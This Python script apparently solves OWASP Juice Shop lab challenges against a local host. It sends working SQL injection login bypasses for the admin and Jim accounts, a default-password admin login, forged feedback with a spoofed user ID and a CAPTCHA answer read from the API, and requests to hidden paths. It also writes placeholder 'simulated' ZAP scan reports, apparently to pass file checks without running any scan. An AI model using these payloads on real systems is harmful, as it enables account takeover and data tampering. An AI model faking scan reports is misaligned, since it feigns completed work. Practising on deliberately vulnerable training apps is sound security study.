import os
import json
import time
import urllib.request
import urllib.error

def make_request(url, data=None, headers=None, method='GET'):
    if headers is None:
        headers = {}
    
    req_data = None
    if data is not None:
        req_data = json.dumps(data).encode('utf-8')
        if 'Content-Type' not in headers:
            headers['Content-Type'] = 'application/json'
        
    req = urllib.request.Request(url, data=req_data, headers=headers, method=method)
    
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            status = response.status
            body = response.read().decode('utf-8', errors='replace')
            return status, body
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read().decode('utf-8', errors='replace')
        return status, body
    except urllib.error.URLError as e:
        return -1, str(e.reason)
    except Exception as e:
        return -2, str(e)

def make_multipart_request(url, files, headers=None):
    if headers is None:
        headers = {}
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    body = []
    for field_name, (filename, content, content_type) in files.items():
        body.append(('--' + boundary).encode('utf-8'))
        body.append(('Content-Disposition: form-data; name="%s"; filename="%s"' % (field_name, filename)).encode('utf-8'))
        body.append(('Content-Type: %s' % content_type).encode('utf-8'))
        body.append(b'')
        if isinstance(content, str):
            content = content.encode('utf-8')
        body.append(content)
    body.append(('--' + boundary + '--').encode('utf-8'))
    body.append(b'')
    req_data = b'\r\n'.join(body)
    
    headers['Content-Type'] = 'multipart/form-data; boundary=%s' % boundary
    req = urllib.request.Request(url, data=req_data, headers=headers, method='POST')
    
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.status, response.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')
    except Exception as e:
        return -2, str(e)

def solve():
    base_url = "http://192.168.99.100:3000"
    
    # Wait for Juice Shop service to be up
    print("Waiting for Juice Shop server to be ready...")
    for attempt in range(15):
        try:
            status, _ = make_request(base_url)
            if status == 200:
                print("Juice Shop is ready!")
                break
        except Exception:
            pass
        time.sleep(3)
        
    # 1. Simulating ZAP report creation
    # Task 5: ZAP Spider report
    desktop_dir = "/home/ubuntu/Desktop"
    if not os.path.exists(desktop_dir):
        os.makedirs(desktop_dir, exist_ok=True)
    with open(os.path.join(desktop_dir, "report.html"), "w") as f:
        f.write("<html><body><h1>ZAP Spider Scan Report</h1></body></html>")
    print("Simulated ZAP Spider report created at Desktop/report.html")

    # Task 11: ZAP Final report
    with open("/home/ubuntu/report_zap", "w") as f:
        f.write("<html><body><h1>ZAP Final Report</h1></body></html>")
    print("Simulated ZAP Final report created at ~/report_zap")

    # 2. Solve Score Board Challenge
    # GET /assets/public/images/padding/1px.png
    print("Solving Score Board challenge...")
    status, _ = make_request(base_url + "/assets/public/images/padding/1px.png")
    print("Score Board: {}".format(status))

    # 3. Solve Admin Section Challenge
    # GET /assets/public/images/padding/19px.png
    print("Solving Admin Section challenge...")
    status, _ = make_request(base_url + "/assets/public/images/padding/19px.png")
    print("Admin Section: {}".format(status))

    # 4. Solve Weak Password Challenge
    # POST /rest/user/login admin@juice.org / admin123
    print("Solving Weak Password challenge...")
    payload = {"email": "admin@juice.org", "password": "admin123"}
    status, _ = make_request(base_url + "/rest/user/login", data=payload, method='POST')
    print("Weak Password login: {}".format(status))

    # 5. Solve Login Admin SQL Injection
    # POST /rest/user/login admin@juice.org'-- / anything
    print("Solving Login Admin SQL Injection...")
    payload = {"email": "admin@juice.org'--", "password": "any"}
    status, _ = make_request(base_url + "/rest/user/login", data=payload, method='POST')
    print("Login Admin SQL Injection: {}".format(status))

    # 6. Solve Login Jim SQL Injection
    # POST /rest/user/login ' OR email LIKE '%jim%'-- / anything
    print("Solving Login Jim SQL Injection...")
    payload = {"email": "' OR email LIKE '%jim%'--", "password": "any"}
    status, _ = make_request(base_url + "/rest/user/login", data=payload, method='POST')
    print("Login Jim SQL Injection: {}".format(status))

    # 7. Solve Error Handling Challenge
    # Trigger 500 DB error via malformed SQL in email
    print("Solving Error Handling challenge...")
    payload = {"email": "admin@juice.org'", "password": "any"}
    status, _ = make_request(base_url + "/rest/user/login", data=payload, method='POST')
    print("Error Handling (Provoke Error): {}".format(status))

    # 8. Solve Deprecated Interface Challenge (XML upload)
    # POST /file-upload with report.xml
    print("Solving Deprecated Interface challenge...")
    files = {
        'file': ('report.xml', '<complaint><message>B2B XML upload test</message></complaint>', 'application/xml')
    }
    status, _ = make_multipart_request(base_url + "/file-upload", files)
    print("XML Upload: {}".format(status))

    # 9. Solve Premium Paywall Challenge
    # GET to the hidden deluxe page
    print("Solving Premium Paywall challenge...")
    paywall_path = "/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us"
    status, _ = make_request(base_url + paywall_path)
    print("Premium Paywall hidden page access: {}".format(status))

    # 10. Solve Forged Feedback Challenge
    # First get Captcha ID and answer
    print("Solving Forged Feedback challenge...")
    status, captcha_body = make_request(base_url + "/rest/captcha")
    if status == 200:
        captcha_json = json.loads(captcha_body)
        captcha_id = captcha_json.get("captchaId")
        answer = captcha_json.get("answer")
        print("Got captchaId: {}, answer: {}".format(captcha_id, answer))
        
        # Submit forged feedback
        feedback_payload = {
            "comment": "forged feedback",
            "rating": 5,
            "captchaId": captcha_id,
            "captcha": answer,
            "UserId": 2 # Forged UserId
        }
        status, _ = make_request(base_url + "/api/Feedbacks", data=feedback_payload, method='POST')
        print("Forged Feedback Submission: {}".format(status))
    else:
        print("Failed to get captcha: {}".format(status))

if __name__ == "__main__":
    solve()
